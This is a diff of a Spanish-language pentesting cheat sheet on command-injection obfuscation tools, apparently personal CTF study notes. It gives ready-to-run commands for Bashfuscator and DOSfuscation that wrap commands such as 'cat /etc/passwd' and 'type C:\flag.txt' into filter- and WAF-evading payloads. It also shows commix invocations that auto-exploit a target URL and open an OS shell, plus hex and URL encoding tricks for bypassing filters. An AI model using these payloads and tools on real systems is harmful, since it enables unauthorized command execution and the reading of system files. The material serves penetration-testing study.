@@ -1,69 +1,70 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/tool
   - vuln/command-injection
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[OS Command Injection]]"
+  - '[[OS Command Injection]]'
 ---
-# Command Injection - Herramientas de Obfuscación Automática
+# Command Injection - Herramientas de Ofuscación Automática
 
 ***
 
-## Cheatsheet
+## Bashfuscator (Linux)
 
-### 1. Linux: Bashfuscator
-
-Framework modular para ofuscar scripts de Bash.
-
-- **Repo:** `https://github.com/Bashfuscator/Bashfuscator`
-
-|                   **Acción**                    |                                                                          **Comando / Flag**                                                                          |                                                **Descripción**                                                 |
-|:-----------------------------------------------:|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------:|:--------------------------------------------------------------------------------------------------------------:|
-| <br><br><br><br><br><br><br><br>**Instalación** | <pre><code>git clone ...<br><br>  <br><br>cd Bashfuscator<br><br>  <br><br>pip3 install setuptools==65<br><br>  <br><br>python3 setup.py install --user</code></pre> | <br><br><br><br><br><br><br>Requiere `setuptools==65` específicamente. Se ejecuta desde `./bashfuscator/bin/`. |
-|               <br>**Uso Básico**                |                                                     <pre><code>./bashfuscator -c 'cat /etc/passwd'</code></pre>                                                      |                <br>Genera un payload aleatorio. **Ojo:** Puede generar salidas enormes (+1MB).                 |
-|  <br>**Uso Optimizado**<br><br>_(Recomendado)_  |                                        <pre><code>./bashfuscator -c 'comando' -s 1 -t 1 --no-mangling --layers 1</code></pre>                                        |           <br>Genera payloads **cortos y simples**. Ideal para inyecciones con límite de caracteres.           |
-|              <br>**Verificación**               |                                                          <pre><code>bash -c 'PAYLOAD_GENERADO'</code></pre>                                                          |                 <br>Prueba localmente que el churro de código generado ejecuta lo que quieres.                 |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `git clone https://github.com/Bashfuscator/Bashfuscator && cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user` | Instalación completa | Setup inicial. `setuptools==65` específico — versiones nuevas rompen. |
+| `./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd'` | Payload random ofuscado | Test rápido. **Cuidado**: output puede ser +1MB. |
+| `./bashfuscator/bin/bashfuscator -c 'cmd' -s 1 -t 1 --no-mangling --layers 1` | Payload corto y simple (recomendado) | Inyecciones con límite de caracteres. |
+| `./bashfuscator/bin/bashfuscator -c 'cmd' --layers 3` | 3 capas de ofuscación anidadas | Filtro/WAF agresivo. |
+| `./bashfuscator/bin/bashfuscator -c 'cmd' --choose-mutators COMMAND/Reverse` | Aplica mutación específica | Cuando sabés qué evade el filtro. |
+| `./bashfuscator/bin/bashfuscator --list-mutators` | Lista todas las mutaciones disponibles | Reconocimiento de opciones. |
+| `bash -c 'PAYLOAD_GENERADO'` | Verificación local del payload | Antes de inyectar — confirma que ejecuta. |
 ^ci-herramienta-linux
 
----
+___
 
-### 2. Windows: DOSfuscation
+## DOSfuscation (Windows)
 
-Herramienta interactiva para ofuscar comandos de CMD (usando variables de entorno y substrings).
+Tool interactiva — PowerShell module. Funciona en Linux con `pwsh`.
 
-- **Repo:** `https://github.com/danielbohannon/Invoke-DOSfuscation.git`
-- **Plataforma:** PowerShell (Funciona en Linux vía `pwsh`).
-
-|         **Paso**          |                             **Comando (Interfaz Interactiva)**                              |                             **Descripción**                             |
-|:-------------------------:|:-------------------------------------------------------------------------------------------:|:-----------------------------------------------------------------------:|
-|  <br><br>**1. Iniciar**   | <pre><code>Import-Module .\Invoke-DOSfuscation.psd1<br><br>Invoke-DOSfuscation</code></pre> | <br><br>Carga el módulo y lanza la shell interactiva de la herramienta. |
-|   <br>**2. Setear Cmd**   |                    <pre><code>SET COMMAND type C:\flag.txt</code></pre>                     |               <br>Define el comando que quieres ocultar.                |
-| <br>**3. Elegir Técnica** |                              <pre><code>encoding</code></pre>                               |     Entra al menú de codificación (basado en variables de entorno).     |
-|    <br>**4. Generar**     |                                  <pre><code>1</code></pre>                                  |     <br>Selecciona la variante 1 (suele usar `%TEMP:~-3,-2%` etc).      |
-|     <br>**Resultado**     |                        <pre><code>typ%TEMP:~-3,-2% ...</code></pre>                         |      <br>Copia el output final para inyectarlo en la CMD víctima.       |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git` | Repo local | Setup. |
+| `Import-Module .\Invoke-DOSfuscation.psd1; Invoke-DOSfuscation` | Lanza shell interactiva | Sesión de ofuscación. |
+| `SET COMMAND type C:\flag.txt` | Define cmd target | Dentro de la shell interactiva. |
+| `encoding` | Entra al menú de codificación | Elegir técnica. |
+| `1` (dentro del menú) | Aplica variante 1 (substring de env vars) | Default — produce algo como `typ%TEMP:~-3,-2%`. |
+| `2`/`3` | Variantes alternativas (FORFILES, etc.) | Si la 1 no pasa filtro. |
+| `sudo apt install powershell && pwsh` | Ejecutar DOSfuscation en Kali | Sin VM Windows a mano. |
 ^ci-herramienta-windows
 
-> [!TIP] Ejecutar DOSfuscation en Linux (Kali/Parrot)
-> 
-> Si no tienes una VM de Windows a mano, puedes usar esta herramienta en tu Kali:
-> 
-> 1. Instala PowerShell: `sudo apt install powershell`
->     
-> 2. Ejecuta `pwsh` en tu terminal.
->     
-> 3. Sigue los pasos de instalación/uso igual que en Windows.
+___
 
-***
+## Otras tools rápidas
 
-## Overview
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `commix -u 'https://target/?host=*' --batch` | Auto-explota CI con `*` como inject point | Detection + exploitation en uno. |
+| `commix -u 'https://target/?host=*' --os-shell` | Shell interactiva via CI confirmado | Post-explotación. |
+| `python -c "import urllib.parse; print(urllib.parse.quote('PAYLOAD'))"` | URL-encode rápido | Manual injection prep. |
+| `echo -n 'PAYLOAD' \| xxd -p \| sed 's/../\\\\x&/g'` | Hex escape de payload | Filter bypass con `\xHH`. |
+| `xxd -r -p <<< '7768 6f61 6d69'` | Decode hex (whoami) | Local verification. |
+^ci-herramienta-otras
 
+### Comparación rápida
 
-***
+| Tool | Plataforma | Output | Best for |
+|---|---|---|---|
+| **Bashfuscator** | Linux | Payload bash ofuscado | Filtros con keyword blacklists. |
+| **DOSfuscation** | Windows CMD | Payload con env vars | CMD filters strictos. |
+| **commix** | Auto | Exploit completo | Discovery + exploitation directa. |
 
+---
